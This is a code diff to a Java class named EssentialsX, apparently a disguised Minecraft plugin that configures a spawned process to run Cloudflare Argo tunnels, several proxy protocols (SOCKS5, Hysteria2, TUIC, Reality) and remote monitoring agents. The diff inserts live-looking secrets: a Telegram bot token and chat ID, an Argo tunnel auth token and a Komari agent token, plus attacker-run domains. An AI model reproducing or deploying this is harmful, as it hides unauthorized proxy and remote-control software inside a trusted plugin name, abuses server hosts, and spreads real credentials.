@@ -86,30 +86,30 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "92d332e3-4919-4b07-b12f-89e48e27a7fc");
+        env.put("UUID", "47575fcd-a251-4f14-92a5-3914d01d3e2a");
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "");
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "mcserverhostsg.liuping.ccwu.cc");
-        env.put("ARGO_AUTH", "eyJhIjoiNDQ3MzQxNGZkNDc5Y2E1MmZiYTZjYjZkMWI5NGQ1NmMiLCJ0IjoiMTQ3ZDAwZTktM2Q3NC00NzgxLTlhNDgtZTNlMTFhNTViNTgyIiwicyI6Ik5HSXpOemswWWpFdFpXRTBNUzAwWm1ZeUxXRTNNRGd0TkRZMU9EY3dORE0yTkRJNCJ9");
-        env.put("S5_PORT", "14895");
-        env.put("HY2_PORT", "14895");
-        env.put("TUIC_PORT", "14497");
+        env.put("ARGO_DOMAIN", "overnodefr.liuping.ccwu.cc");
+        env.put("ARGO_AUTH", "eyJhIjoiNDQ3MzQxNGZkNDc5Y2E1MmZiYTZjYjZkMWI5NGQ1NmMiLCJ0IjoiNjlmNTk1ZjgtZTY5NS00YmMzLThiNDgtZDNhOTcyZmRhMDk1IiwicyI6Ik56TXdOV1kyWlRJdFpUSmtNUzAwWWpoakxUZzRORFl0WkRCbVpqUmtNakZtT0dNMiJ9");
+        env.put("S5_PORT", "25581");
+        env.put("HY2_PORT", "25581");
+        env.put("TUIC_PORT", "25596");
         env.put("ANYTLS_PORT", "");
-        env.put("REALITY_PORT", "14497");
+        env.put("REALITY_PORT", "25596");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
-        env.put("CHAT_ID", "");
-        env.put("BOT_TOKEN", "");
+        env.put("CHAT_ID", "8502788454");
+        env.put("BOT_TOKEN", "8482650749:AAFgsXcRZRbcsV_iFymCgJkGuaP9-67XqSQ");
         env.put("CFIP", "youxuan.cf.090227.xyz");
         env.put("CFPORT", "443");
         env.put("NAME", "");
         env.put("DISABLE_ARGO", "false");
         // ---- Komari Agent 默认值 ----
         env.put("KOMARI_SERVER", "https://komari.liuping.ccwu.cc");
-        env.put("KOMARI_TOKEN", "5joGsAiUWIJKavlazOHoYm");
+        env.put("KOMARI_TOKEN", "BVhH0YuWRCPQLf3ldigxf7");
         
         // Load from system environment variables
         for (String var : ALL_ENV_VARS) {
